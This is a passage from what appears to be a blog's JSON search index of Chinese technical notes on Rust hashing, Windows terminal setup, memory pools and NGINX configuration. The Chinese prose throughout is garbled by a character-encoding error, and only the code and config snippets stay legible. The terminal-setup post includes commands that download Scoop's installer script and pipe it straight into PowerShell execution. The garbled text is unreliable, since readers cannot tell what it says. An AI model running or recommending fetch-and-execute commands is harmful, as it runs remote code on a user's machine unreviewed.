å¤§é‡å†…å®¹ï¼Œåˆåˆ é™¤å¤§é‡å†…å®¹ï¼Œè¿™æ—¶ï¼Œæœ€å¥½ä½¿ç”¨ shrink_to_fit / shrink_to é‡Šæ”¾ä¸éœ€è¦çš„å†…å­˜å ç”¨ã€‚ å¦‚æœéœ€è¦è‡ªå®šä¹‰ Hash Keyï¼Œåªéœ€è¦å®šä¹‰ä¸‰ä¸ª Traitï¼šHashã€PartialEqã€Eqã€‚ HashSet / BTreeMap / BTreeSet HashSet ç”¨äºç®€å•ç¡®è®¤å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ã€‚ BTreeMap å’Œ BTreeSet æ˜¯å†…éƒ¨ä½¿ç”¨ B-tree æ¥ç»„ç»‡å“ˆå¸Œè¡¨çš„æ•°æ®ç»“æ„ï¼Œç”¨æ¥å­˜æ”¾æœ‰åºé›†åˆã€‚ BTreeMap çš„ keyï¼Œéœ€è¦å®ç° PartialOrd å’Œ Ord Traitã€‚ SipHash SipHash å°±æ˜¯ä¸ºäº†å›åº” DoS æ”»å‡»è€Œåˆ›å»ºçš„å“ˆå¸Œç®—æ³•ï¼Œè™½ç„¶å’Œ sha2 è¿™æ ·çš„åŠ å¯†å“ˆå¸Œä¸åŒï¼ˆä¸è¦å°† SipHash ç”¨äºåŠ å¯†ï¼ï¼‰ï¼Œä½†å®ƒå¯ä»¥æä¾›æ›´å¥½çš„å®‰å…¨æ€§ã€‚æŠŠ SipHash ä½œä¸º HashMap çš„ç¼ºçœçš„å“ˆå¸Œç®—æ³•ï¼ŒRust å¯ä»¥é¿å…å¼€å‘è€…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¢« DoSã€‚ è¿™ä¸€åˆ‡çš„ä»£ä»·æ˜¯æ€§èƒ½æŸè€—ï¼Œè™½ç„¶ SipHash éå¸¸å¿«ï¼Œä½†æ¯” hashbrown ä½¿ç”¨çš„ Ahash æ…¢äº†ä¸å°‘ã€‚å¦‚æœä¸éœ€è¦ DoS é˜²æŠ¤ï¼ˆæ¯”å¦‚ä¸€ä¸ªå®Œå…¨å†…éƒ¨ä½¿ç”¨çš„ HashMapï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ Ahash æ¥æ›¿æ¢ã€‚ä½¿ç”¨ Ahash æä¾›çš„ RandomState å³å¯ï¼š 12345use ahash::&#123;AHasher, RandomState&#125;;use std::collections::HashMap;let mut map: HashMap&lt;char, i32, RandomState&gt; = HashMap::default();map.insert('a', 1);","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"Windowsç»ˆç«¯é…ç½®","slug":"Windowsç»ˆç«¯é…ç½®","date":"2024-03-18T14:42:15.000Z","updated":"2024-03-18T14:59:27.880Z","comments":true,"path":"posts/a61fc9c9.html","link":"","permalink":"https://racleray.github.io/posts/a61fc9c9.html","excerpt":"windows é…ç½® wezterm ç»ˆç«¯ç¯å¢ƒè®°å½•ï¼ˆarchiveï¼‰","text":"ç¯å¢ƒ: Windows 10 scoop (optional) Scoop 12Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUserInvoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression ç®¡ç†å‘˜æƒé™ä¸‹å®‰è£… 1iex \"&amp; &#123;$(irm get.scoop.sh)&#125; -RunAsAdmin\" neovim å®‰è£… 1scoop install neovim wezterm ä¸‹è½½å®‰è£… é…ç½®ï¼š KevinSilvester/wezterm-config QianSong1/wezterm-config é…ç½®æ–‡ä»¶ç›®å½•ï¼šC:\\Users\\[your user name]\\.config\\wezterm ä¸»é¢˜ï¼š catppuccin å¿«æ·é”®å¯¼å‡ºï¼š 1echo $(wezterm show-keys) &gt;&gt; C:\\\\Users\\\\Administrator\\\\Desktop\\\\wez_keys.xls powershell starship: Releases Â· starship/starship (github.com) ä¸‹è½½å®‰è£… å®‰è£… posh 12Install-Module posh-git -Scope CurrentUser # posh-gitInstall-Module oh-my-posh -Scope CurrentUser -RequiredVersion 2.0.496 # oh-my-posh ä¿®æ”¹é…ç½®æ–‡ä»¶ 1nvim $Profile æ·»åŠ ä»¥ä¸‹å†…å®¹ 123456789101112131415161718Import-Module posh-git # å¼•å…¥ posh-gitImport-Module oh-my-posh # å¼•å…¥ oh-my-poshInvoke-Expression (&amp;starship init powershell) # å¼•å…¥StarshipSet-PSReadLineOption -PredictionSource History # è®¾ç½®é¢„æµ‹æ–‡æœ¬æ¥æºä¸ºå†å²è®°å½• Set-PSReadlineKeyHandler -Key Tab -Function Complete # è®¾ç½® Tab é”®è¡¥å…¨Set-PSReadLineKeyHandler -Key \"Ctrl+d\" -Function MenuComplete # è®¾ç½® Ctrl+d ä¸ºèœå•è¡¥å…¨å’Œ IntellisenseSet-PSReadLineKeyHandler -Key \"Ctrl+z\" -Function Undo # è®¾ç½® Ctrl+z ä¸ºæ’¤é”€Set-PSReadLineKeyHandler -Key UpArrow -ScriptBlock &#123; [Microsoft.PowerShell.PSConsoleReadLine]::HistorySearchBackward() [Microsoft.PowerShell.PSConsoleReadLine]::EndOfLine()&#125;Set-PSReadLineKeyHandler -Key DownArrow -ScriptBlock &#123; [Microsoft.PowerShell.PSConsoleReadLine]::HistorySearchForward() [Microsoft.PowerShell.PSConsoleReadLine]::EndOfLine()&#125; é‡å¯ç»ˆç«¯ 1234567Move-Item $env:LOCALAPPDATA\\nvim $env:LOCALAPPDATA\\nvim.bakMove-Item $env:LOCALAPPDATA\\nvim-data $env:LOCALAPPDATA\\nvim-data.bakgit clone --depth 1 https://github.com/AstroNvim/AstroNvim $env:LOCALAPPDATA\\nvimnvim ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼ŒWindows ä¸‹é…ç½®ç›®å½•ä¸ºï¼šC:\\Users\\Administrator\\AppData\\Local\\nvimï¼š Managing User Configuration | AstroNvim Docs AstroNvim é…ç½® https://github.com/AstroNvim/astrocommunity C:\\Users\\Administrator\\AppData\\Local\\nvim\\.gitignore æ³¨é‡Šæ‰ lua/user C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\plugins\\community.lua æ·»åŠ ç¤¾åŒºç¬¬ä¸‰æ–¹åŒ… C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\init.lua é…ç½®ç¬¬ä¸‰æ–¹åŒ… 1234567891011return &#123; -- Add the community repository of plugin specifications \"AstroNvim/astrocommunity\", -- example of importing a plugin, comment out to use it or add your own -- available plugins can be found at https://github.com/AstroNvim/astrocommunity &#123; import = \"astrocommunity.colorscheme.catppuccin\" &#125;, -- &#123; import = \"astrocommunity.completion.copilot-lua-cmp\" &#125;, &#123; import = \"astrocommunity.utility.noice-nvim\" &#125;, &#123; import = \"astrocommunity.completion.cmp-cmdline\" &#125;,&#125; å¼€å§‹ç•Œé¢é…ç½® C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\plugins\\core.lua æ›¿æ¢opts.section.header.val å­—ç¬¦ä¸²å³å¯ã€‚ LSP :LspInstall éœ€è¦çš„å®‰è£…åŒ…ã€‚é…ç½®éƒ½å† user æ–‡ä»¶ä¸‹çš„ lua è„šæœ¬ä¸­ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Terminal","slug":"Tools/Terminal","permalink":"https://racleray.github.io/categories/Tools/Terminal/"}],"tags":[{"name":"terminal","slug":"terminal","permalink":"https://racleray.github.io/tags/terminal/"},{"name":"configure","slug":"configure","permalink":"https://racleray.github.io/tags/configure/"}],"author":"HeRui"},{"title":"Memory Pool","slug":"Memory-Pool","date":"2024-03-17T13:30:22.000Z","updated":"2024-03-17T13:48:07.461Z","comments":true,"path":"posts/5d8e957f.html","link":"","permalink":"https://racleray.github.io/posts/5d8e957f.html","excerpt":"å†…å­˜æ± å®ç°ä¸å¯¹æ¯”","text":"SGI Memory Pool å¤§äº 128Bytes ç›´æ¥ä½¿ç”¨ malloc / free ï¼Œåªç®¡ç†å†…å­˜ï¼Œä¸è´Ÿè´£æ„é€ ä¸ææ„ã€‚ å°äº 128Bytes ä½¿ç”¨è‡ªå®šä¹‰å†…å­˜ç©ºé—´ç®¡ç†ã€‚ 8ã€16ã€24ã€... ã€128 å¤§å°çš„å†…å­˜å—æŒ‡é’ˆæ•°ç»„ç»Ÿä¸€ç®¡ç† 1234union _Obj &#123; union _Obj* _M_free_list_link; char _M_client_data[1]; /* The client sees this. */&#125;; æ¯ä¸ªå¤§å°å†…å­˜å—ç»„ç»‡åœ¨ä¸€ä¸ªå¤§çš„å†…å­˜ç©ºé—´ï¼Œç»´æŠ¤ èµ·å§‹åœ°å€ã€ç»“æŸåœ°å€å’Œå¯¹ç©ºé—´å¤§å° 123static char* _S_start_free;static char* _S_end_free;static size_t _S_heap_size; ç»„ç»‡å¯ç”¨å†…å­˜å—ä¸ºä¸€ä¸ªé“¾è¡¨ï¼Œé¡¶å±‚ç®¡ç†çš„æŒ‡é’ˆæ•°ç»„ä¸­çš„å…ƒç´ ï¼ŒæŒ‡å‘å¯¹åº”å†…å­˜å—åŒºåŸŸä¸­ï¼Œé¦–ä¸ªå¯ç”¨çš„å†…å­˜å—åœ°å€ ç”³è¯·å’Œé‡Šæ”¾å†…å­˜å—ï¼Œå°±æ˜¯åœ¨æ”¹å˜é“¾è¡¨çš„æŒ‡å‘ å½“ç„¶ï¼Œå·²ç»ç”³è¯·çš„å†…å­˜ï¼Œåœ¨å†…å­˜æ± å›æ”¶å‰ï¼Œéƒ½ä¸ä¼šé‡Šæ”¾ã€‚ å†…å­˜æ± ç®¡ç†æ¥å£ï¼š 123456789101112131415161718// åˆ†é…å†…å­˜çš„å…¥å£å‡½æ•°static void* allocate(size_t __n)// æŠŠåˆ†é…å¥½çš„chunkå—æ·»åŠ åˆ°è‡ªç”±é“¾è¡¨å½“ä¸­static void* _S_refill(size_t __n);// åˆ†é…ç›¸åº”__sizeå­—èŠ‚å¤§å°çš„chunkå—ï¼Œ__nobjsä¸ªï¼ˆå‡½æ•°å†…å¯ä¿®æ”¹ï¼‰static char* _S_chunk_alloc(size_t __size, int&amp; __nobjs);// æŠŠchunkå—å½’è¿˜åˆ°å†…å­˜æ± static void deallocate(void* __p, size_t __n);// å†…å­˜æ± æ‰©å®¹å‡½æ•°template &lt;bool threads, int inst&gt;void*__default_alloc_template&lt;threads, inst&gt;::reallocate(void* __p, size_t __old_sz, size_t __new_sz); å¦å¤–åˆä¸¤ä¸ªè¾…åŠ©å‡½æ•°ï¼š åœ°å€å¯¹é½ç”¨çš„å‡½æ•° _S_round_up 12345/*å°† __bytes ä¸Šè°ƒè‡³æœ€é‚»è¿‘çš„ 8 çš„å€æ•°*/static size_t _S_round_up(size_t __bytes) &#123; return (((__bytes) + (size_t) _ALIGN-1) &amp; ~((size_t) _ALIGN - 1)); &#125;// ~((size_t) _ALIGN - 1) å¾—åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ©ç  1111...1000 å†…å­˜å—æŒ‡é’ˆæ•°ç»„ä¸­æ‰¾åˆ°å¯¹åº” chunk å—å¤§å°çš„å‡½æ•° _S_freelist_index 1234/*è¿”å› __bytes å¤§å°çš„chunkå—ä½äº free-list ä¸­çš„ç¼–å·*/static size_t _S_freelist_index(size_t __bytes) &#123; return (((__bytes) + (size_t)_ALIGN-1)/(size_t)_ALIGN - 1); &#125; NGINX Memory Pool 123456789101112131415161718struct ngx_pool_s &#123; ngx_pool_data_t d; //å†…å­˜æ± æ•°æ®ç®¡ç†ç›¸å…³æŒ‡é’ˆçš„ç»“æ„ä½“ size_t max; //ngx_pool_data_tå¯åˆ†é…çš„æœ€å¤§å†…å­˜å€¼ï¼Œè¶…è¿‡æ­¤å€¼åˆ™ä½¿ç”¨ ngx_pool_large_t åˆ†é…å†…å­˜ ngx_pool_t *current; //å½“å‰å†…å­˜æ± æŒ‡é’ˆ ngx_chain_t *chain; //æŒ‚æ¥ä¸€ä¸ªngx_chain_tç»“æ„ ngx_pool_large_t *large; //å¤§å—å†…å­˜é“¾è¡¨ ngx_pool_cleanup_t *cleanup; //é‡Šæ”¾å†…å­˜æ± çš„æ“ä½œé›†ï¼ˆcallbackå‡½æ•°ï¼‰ ngx_log_t *log; //æ—¥å¿—ä¿¡æ¯&#125;;typedef struct ngx_pool_s ngx_pool_t;typedef struct &#123; u_char *last; //å½“å‰å†…å­˜æ± åˆ†é…åˆ°çš„æœ«å°¾åœ°å€ï¼Œå³ä¸‹ä¸€æ¬¡åˆ†é…å¼€å§‹åœ°å€ u_char *end; //å†…å­˜æ± ç»“æŸä½ç½® ngx_pool_t *next; //ä¸‹ä¸€å—å†…å­˜ ngx_uint_t failed; //å½“å‰å—å†…å­˜åˆ†é…å¤±è´¥æ¬¡æ•°&#125; ngx_pool_data_t; å°å—å†…å­˜ï¼Œé€šè¿‡ ngx_pool_data_t ç»„ç»‡ä¸ºé“¾è¡¨ç»“æ„ï¼Œåœ¨ last åˆ° end ä¹‹é—´åˆ†é…å†…å­˜ä½¿ç”¨ã€‚ä¸è¶³æ—¶ï¼Œä¼šæ–°å¼€è¾Ÿä¸€ä¸ªå†…å­˜å—ã€‚ 1234struct ngx_pool_large_s &#123; ngx_pool_large_t *next; // ä¸‹ä¸€ä¸ªå¤§å—å†…å­˜ void *alloc; // è®°å½•åˆ†é…çš„å¤§å—å†…å­˜çš„èµ·å§‹åœ°å€&#125;; å¤§å—å†…å­˜ï¼Œé€šè¿‡ ngx_pool_large_s ç»„ç»‡ä¸ºé“¾è¡¨ï¼Œä½¿ç”¨å’Œé‡Šæ”¾å°±æ˜¯åŒ…è£…ä¹‹åçš„ malloc å’Œ freeã€‚ 12345678910typedef void (*ngx_pool_cleanup_pt)(void *data); // æ¸…ç†å›è°ƒå‡½æ•°çš„ç±»å‹å®šä¹‰typedef struct ngx_pool_cleanup_s ngx_pool_cleanup_t;// æ¸…ç†æ“ä½œçš„ç±»å‹å®šä¹‰ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ¸…ç†å›è°ƒå‡½æ•°ï¼Œä¼ ç»™å›è°ƒå‡½æ•°çš„æ•°æ®å’Œä¸‹ä¸€ä¸ªæ¸…ç†æ“ä½œçš„åœ°å€struct ngx_pool_cleanup_s &#123; ngx_pool_cleanup_pt handler; // æ¸…ç†å›è°ƒå‡½æ•° void *data; // ä¼ é€’ç»™å›è°ƒå‡½æ•°çš„æŒ‡é’ˆ ngx_pool_cleanup_t *next; // æŒ‡å‘ä¸‹ä¸€ä¸ªæ¸…ç†æ“ä½œ&#125;; å†…å­˜æ± çš„æ¸…ç†ï¼Œä¸€èˆ¬åœ¨å†…å­˜æ± é”€æ¯ä¹‹å‰ã€‚ å†…å­˜æ± çš„ä¸€èˆ¬æ¥å£ä¸ºï¼š 1234567891011ngx_pool_t *ngx_create_pool(size_t size, ngx_log_t *log); // åˆ›å»ºå†…å­˜æ± void ngx_destroy_pool(ngx_pool_t *pool); // é”€æ¯å†…å­˜æ± void ngx_reset_pool(ngx_pool_t *pool); // é‡ç½®å†…å­˜æ± void *ngx_palloc(ngx_pool_t *pool, size_t size); // å†…å­˜åˆ†é…å‡½æ•°ï¼Œæ”¯æŒå†…å­˜å¯¹é½void *ngx_pnalloc(ngx_pool_t *pool, size_t size); // å†…å­˜åˆ†é…å‡½æ•°ï¼Œä¸æ”¯æŒå†…å­˜å¯¹é½void *ngx_pcalloc(ngx_pool_t *pool, size_t size); // å†…å­˜åˆ†é…å‡½æ•°ï¼Œæ”¯æŒå†…å­˜åˆå§‹åŒ–0ngx_int_t ngx_pfree(ngx_pool_t *pool, void *p); // å†…å­˜é‡Šæ”¾ï¼ˆå¤§å—å†…å­˜ï¼‰,ä¸æ”¯æŒå°å—å†…å­˜ ngx_pool_cleanup_t *ngx_pool_cleanup_add(ngx_pool_t *p, size_t size); // æ·»åŠ æ¸…ç†handler å°å—å†…å­˜æ± çš„ç”³è¯·ï¼Œéœ€è¦æ‰‹åŠ¨è¿›è¡Œå†…å­˜å¯¹é½ï¼Œä»¥å¢åŠ å†…å­˜æ“ä½œçš„æ•ˆç‡ï¼Œå› ä¸ºæ²¡æœ‰ä½¿ç”¨ malloc ä¸ä¼šè‡ªåŠ¨å¯¹é½ã€‚ 12#define ngx_align_ptr(p, a) \\(u_char *) (((uintptr_t) (p) + ((uintptr_t) a - 1)) &amp; ~((uintptr_t) a - 1)) è¿™ä¸ªæ“ä½œçš„é€»è¾‘å’Œ _S_round_up æ˜¯ä¸€è‡´çš„ã€‚å°†æŒ‡é’ˆ p å‘ä¸Šå¯¹é½åˆ°æœ€æ¥è¿‘çš„ a çš„å€æ•°ã€‚ å®ç°ä¸æµ‹è¯• github link ï¼›ä¸€ä¸ªç±»ä¼¼çš„ç®€åŒ–ç‰ˆ NGINX å†…å­˜æ± å®ç° MemoryPoolã€‚ æ•´ä½“è€Œè¨€ï¼Œè‡ªå®šä¹‰å®ç°çš„ MemoryPool allocator æ€§èƒ½æ¯” SGI Memory Pool æ€§èƒ½ä¼šå¥½ä¸€äº›ã€‚ SGI Memory Pool çš„æ€§èƒ½å’Œ STL é»˜è®¤ allocator æ€§èƒ½ç›¸å·®æ— å‡ ã€‚NGINX Memory Pool æ€§èƒ½ä¼šæ¯” SGI Memory Pool æ›´å¥½ã€‚ä½†æ˜¯NGINX Memory Pool å¹¶æ²¡æœ‰å®ç°ä¸º allocator çš„å½¢å¼ã€‚ å†…å­˜ç®¡ç†ç›¸å…³ å¯¹ malloc çš„è¿›ä¸€æ­¥ä¼˜åŒ–ï¼š jemalloc mimalloc well document tcmalloc å…¶ä¸­ jemalloc å’Œ mimallic ä¼šæ˜¯æ›´ä¼˜çš„é€‰æ‹©ã€‚ ç›¸å…³å­¦ä¹ åšå®¢æ¨èä¸ºï¼š å†…å­˜åˆ†é…å™¨ä¹‹jemallocæŠ€æœ¯åŸç†åˆ†æ JeMalloc çœ‹äº†ä½†æ˜¯å¿˜äº†ï¼Œè¿˜æ˜¯éšä¾¿æ€»ç»“ä¸€ç‚¹å¯èƒ½ä¼šå¥½ä¸€äº›å§ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Memory","slug":"Notes/Memory","permalink":"https://racleray.github.io/categories/Notes/Memory/"}],"tags":[{"name":"Memory Pool","slug":"Memory-Pool","permalink":"https://racleray.github.io/tags/Memory-Pool/"},{"name":"Memory","slug":"Memory","permalink":"https://racleray.github.io/tags/Memory/"}],"author":"HeRui"},{"title":"NGINX Recap","slug":"NGINX-Recap","date":"2024-03-09T15:57:33.000Z","updated":"2024-03-09T16:02:34.925Z","comments":true,"path":"posts/e2369d80.html","link":"","permalink":"https://racleray.github.io/posts/e2369d80.html","excerpt":"NGINX ä¸€ç‚¹å°ç»“","text":"ä½¿ç”¨é…ç½® è®¨è®ºçš„ä½¿ç”¨åœºæ™¯ï¼š - åå‘ä»£ç† - è´Ÿè½½å‡è¡¡ - æœåŠ¡è·¯ç”± - é™æ€ç«™ç‚¹ - æ–‡ä»¶æœåŠ¡å™¨ - å‰åç«¯è·¨åŸŸè®¿é—® èµ„æºé“¾æ¥ï¼š - NGINXé…ç½®æ•™ç¨‹ï¼šNGINXConfig DigitalOcean - NGINXæ–‡æ¡£ï¼šåœ¨çº¿æ–‡æ¡£-nginx åŸºæœ¬ä½¿ç”¨å‘½ä»¤è¡Œï¼š 12345678ginx -s stop # å¿«é€Ÿå…³é—­Nginxï¼Œå¯èƒ½ä¸ä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œå¹¶è¿…é€Ÿç»ˆæ­¢webæœåŠ¡ã€‚nginx -s quit # å¹³ç¨³å…³é—­Nginxï¼Œä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œæœ‰å®‰æ’çš„ç»“æŸwebæœåŠ¡ã€‚nginx -s reload # å› æ”¹å˜äº†Nginxç›¸å…³é…ç½®ï¼Œéœ€è¦é‡æ–°åŠ è½½é…ç½®è€Œé‡è½½ã€‚nginx -s reopen # é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ã€‚nginx -c filename # ä¸º Nginx æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥ä»£æ›¿ç¼ºçœçš„ã€‚nginx -t # æµ‹è¯•é…ç½®æ–‡ä»¶ã€‚nginx å°†æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•çš„æ­£ç¡®æ€§ï¼Œå¹¶å°è¯•æ‰“å¼€é…ç½®æ–‡ä»¶ä¸­æ‰€å¼•ç”¨åˆ°çš„æ–‡ä»¶ã€‚nginx -v # æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ã€‚nginx -V # æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ç‰ˆæœ¬å’Œé…ç½®å‚æ•°ã€‚ åå‘ä»£ç† nginx.conf æ–‡ä»¶å¦‚ä¸‹ã€‚å€¼å¾—æ³¨æ„çš„åœ°æ–¹æœ‰ sendfileã€tcp_nopushã€tcp_nodelay é€‰é¡¹ï¼Œå’Œ location ä»¥åŠ upstream çš„é…ç½®ã€‚é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨ nginx/conf/conf.d/ ç›®å½•ä¸‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#è¿è¡Œç”¨æˆ·#user user_name;#å¯åŠ¨è¿›ç¨‹,é€šå¸¸è®¾ç½®æˆå’Œcpuçš„æ•°é‡ç›¸ç­‰worker_processes 4;#å…¨å±€é”™è¯¯æ—¥å¿—error_log ~/test/nginx-1.10.1/logs/error.log;error_log ~/test/nginx-1.10.1/logs/notice.log notice;error_log ~/test/nginx-1.10.1/logs/info.log info;#PIDæ–‡ä»¶ï¼Œè®°å½•å½“å‰å¯åŠ¨çš„nginxçš„è¿›ç¨‹IDpid ~/test/nginx-1.10.1/logs/nginx.pid;#å·¥ä½œæ¨¡å¼åŠè¿æ¥æ•°ä¸Šé™events &#123; worker_connections 1024; # å•ä¸ªåå°worker processè¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•°&#125;#è®¾å®šhttpæœåŠ¡å™¨ï¼Œåˆ©ç”¨å®ƒçš„åå‘ä»£ç†åŠŸèƒ½æä¾›è´Ÿè½½å‡è¡¡æ”¯æŒhttp &#123; #è®¾å®šmimeç±»å‹(é‚®ä»¶æ”¯æŒç±»å‹),ç±»å‹ç”±mime.typesæ–‡ä»¶å®šä¹‰ include ~/test/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #è®¾å®šæ—¥å¿— log_format main '[$remote_addr] - [$remote_user] [$time_local] \"$request\" '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log ~/test/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile æŒ‡ä»¤æŒ‡å®š nginx æ˜¯å¦è°ƒç”¨ sendfile å‡½æ•°ï¼ˆzero copyï¼‰æ¥ä¼ è¾“æ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨ï¼Œä¸€èˆ¬è®¾ä¸º on #å¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸º offï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦. sendfile on; #å¯ç”¨ TCP NOPUSH é€‰é¡¹æ—¶ï¼Œæ•°æ®åŒ…å°†ç«‹å³å‘é€ç»™å®¢æˆ·ç«¯ï¼Œè€Œä¸ä¼šç­‰å¾… TCP çš„ç¼“å†²åŒºå¡«å……æˆ–è¾¾åˆ°æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMTUï¼‰çš„å¤§å°ã€‚è¿™æœ‰åŠ©äºé™ä½ç½‘ç»œå»¶è¿Ÿï¼Œæé«˜å“åº”é€Ÿåº¦ã€‚ #å½“éœ€è¦å‡å°‘ç½‘ç»œå¸¦å®½ä½¿ç”¨æˆ–å‡è½»æœåŠ¡å™¨è´Ÿè½½æ—¶ï¼Œå¯è®¾ä¸º off #tcp_nopush on; #è¿æ¥è¶…æ—¶æ—¶é—´ keepalive_timeout 120; #ç¦ç”¨ Nagle ç®—æ³•ã€‚Nagle ç®—æ³•çš„ç›®çš„æ˜¯é€šè¿‡åœ¨å‘é€æ•°æ®ä¹‹å‰è¿›è¡Œæ•°æ®ç¼“å†²ï¼Œä»¥æé«˜ç½‘ç»œåˆ©ç”¨ç‡ã€‚å®ƒå°†å°çš„æ•°æ®å—åˆå¹¶æˆæ›´å¤§çš„æ•°æ®åŒ…ï¼Œå‡å°‘å‘é€çš„æ•°æ®åŒ…æ•°é‡ï¼Œä»è€Œå‡å°‘ç½‘ç»œä¸Šçš„ä¼ è¾“å¼€é”€ã€‚ #å¯ç”¨ tcp_nodelay å¯ä»¥å‡å°‘æ•°æ®ä¼ è¾“çš„å»¶è¿Ÿï¼Œä½†å¯èƒ½ä¼šå¢åŠ ç½‘ç»œå¸¦å®½çš„ä½¿ç”¨ã€‚ tcp_nodelay on; #gzipå‹ç¼©å¼€å…³ #gzip on; keepalive_timeout 60; # å®¢æˆ·ç«¯è¿æ¥ä¿æŒä¼šè¯è¶…æ—¶æ—¶é—´ client_header_buffer_size 4k; # å®¢æˆ·ç«¯è¯·æ±‚å¤´éƒ¨çš„ç¼“å†²åŒºå¤§å°ï¼Œä¸€èˆ¬ä¸ºç³»ç»Ÿåˆ†é¡µå¤§å° open_file_cache max=102400 inactive=20s; # æ‰“å¼€æ–‡ä»¶ç¼“å­˜æ•°é‡ï¼Œinactive åˆ é™¤ä¸æ´»è·ƒæ–‡ä»¶ open_file_cache_valid 30s; # å¤šä¹…æ£€æŸ¥ä¸€æ¬¡æœ‰æ•ˆç¼“å­˜ open_file_cache_min_uses 1; # inactive æœ€å°‘ä½¿ç”¨æ¬¡æ•° client_header_timeout 15; # è®¾ç½®è¯·æ±‚å¤´çš„è¶…æ—¶æ—¶é—´ client_body_timeout 15; # è®¾ç½®è¯·æ±‚ä½“çš„è¶…æ—¶æ—¶é—´ reset_timedout_connection on; # å…³é—­ä¸å“åº”çš„å®¢æˆ·ç«¯è¿æ¥ send_timeout 15; # å®¢æˆ·ç«¯å“åº”è¶…æ—¶æ—¶é—´ server_tokens off; # å…³é—­åœ¨é”™è¯¯é¡µé¢ä¸­çš„nginxç‰ˆæœ¬æ•°å­— client_max_body_size 10m; # ä¸Šä¼ æ–‡ä»¶å¤§å°é™åˆ¶ #======================================= #è®¾å®šå®é™…çš„æœåŠ¡å™¨åˆ—è¡¨ upstream actual_server_1 &#123; server 127.0.0.1:8089; &#125; #======================================= #HTTP/HTTPSæœåŠ¡å™¨ server &#123; #ç›‘å¬80ç«¯å£ï¼Œç”¨äºHTTPåè®® listen 80; #========================================== #ç”¨äº HTTPS éƒ¨åˆ† #443 ç”¨äº HTTPS #listen 443 ssl; #sslè¯ä¹¦ç”¨äº HTTPS #sslè¯ä¹¦æ–‡ä»¶ä½ç½®(å¸¸è§è¯ä¹¦æ–‡ä»¶æ ¼å¼ä¸ºï¼šcrt/pem) #ssl_certificate cert.pem; #sslè¯ä¹¦keyä½ç½® #ssl_certificate_key cert.key; #sslé…ç½®å‚æ•°ï¼ˆé€‰æ‹©æ€§é…ç½®ï¼‰ #ssl_session_cache shared:SSL:1m; #ssl_session_timeout 5m; #æ•°å­—ç­¾åï¼Œæ­¤å¤„ä½¿ç”¨MD5 #ssl_ciphers HIGH:!aNULL:!MD5; #ssl_prefer_server_ciphers on; #location / &#123; # root /root; # index index.html index.htm; #&#125; #========================================== #å®šä¹‰ä½¿ç”¨www.xx.comè®¿é—® server_name www.helloworld.com; #é¦–é¡µ index index.html #æŒ‡å‘webappçš„ç›®å½• root ~/code/webapp; #ç¼–ç æ ¼å¼ charset utf-8; #ä»£ç†é…ç½®å‚æ•° proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #åå‘ä»£ç†çš„è·¯å¾„ï¼ˆå’Œupstreamç»‘å®šï¼‰ï¼Œlocation åé¢è®¾ç½®æ˜ å°„çš„è·¯å¾„ location / &#123; proxy_pass http://actual_server_1; &#125; #é™æ€æ–‡ä»¶ï¼Œnginxè‡ªå·±å¤„ç† location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; root ~/code/webapp/views; #è¿‡æœŸ30å¤©ï¼Œé™æ€æ–‡ä»¶ä¸æ€ä¹ˆæ›´æ–°ï¼Œè¿‡æœŸå¯ä»¥è®¾å¤§ä¸€ç‚¹ï¼Œå¦‚æœé¢‘ç¹æ›´æ–°ï¼Œåˆ™å¯ä»¥è®¾ç½®å¾—å°ä¸€ç‚¹ã€‚ expires 30d; &#125; #è®¾å®šæŸ¥çœ‹NginxçŠ¶æ€çš„åœ°å€ location /NginxStatus &#123; stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file conf/htpasswd; &#125; #ç¦æ­¢è®¿é—® .htxxx æ–‡ä»¶ location ~ /\\.ht &#123; deny all; &#125; 